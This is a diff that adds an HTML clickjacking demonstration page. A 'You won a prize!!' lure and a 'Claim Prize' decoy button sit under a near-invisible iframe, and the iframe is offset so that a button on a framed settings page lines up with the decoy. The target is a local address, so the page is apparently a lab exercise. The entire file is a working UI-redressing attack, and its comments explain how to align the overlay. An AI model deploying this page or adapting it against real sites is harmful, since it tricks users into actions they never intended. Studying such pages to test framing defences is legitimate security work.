@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <style>
+        .stage {
+            position: relative;
+            width: 300px;
+            height: 100px;
+            overflow: hidden; /* Clips the remainder of the shifted iframe */
+        }
+
+        /* The visible decoy element the user thinks they are clicking */
+        .decoy-btn {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            width: 140px;
+            height: 45px;
+            background-color: #28a745;
+            color: white;
+            font-size: 16px;
+            border: none;
+            cursor: pointer;
+            z-index: 1;
+        }
+
+        /* The invisible target iframe aligned directly over the decoy */
+        .target-iframe {
+            position: absolute;
+            /* Negative offset pulls the button up and aligns it with the decoy */
+            top: -68px;
+            left: 12px;
+            width: 500px;
+            height: 300px;
+            opacity: 0.0001; /* Set to 0.3 temporarily while aligning visually */
+            z-index: 2;
+            border: none;
+        }
+    </style>
+</head>
+<body>
+    <h1>You won a prize!! - click below!</h1>
+    
+    <div class="stage">
+        <button class="decoy-btn">Claim Prize</button>
+        <iframe class="target-iframe" src="http://127.0.0.1:5500/click-jack/settings.html" scrolling="no"></iframe>
+    </div>
+</body>
+</html>
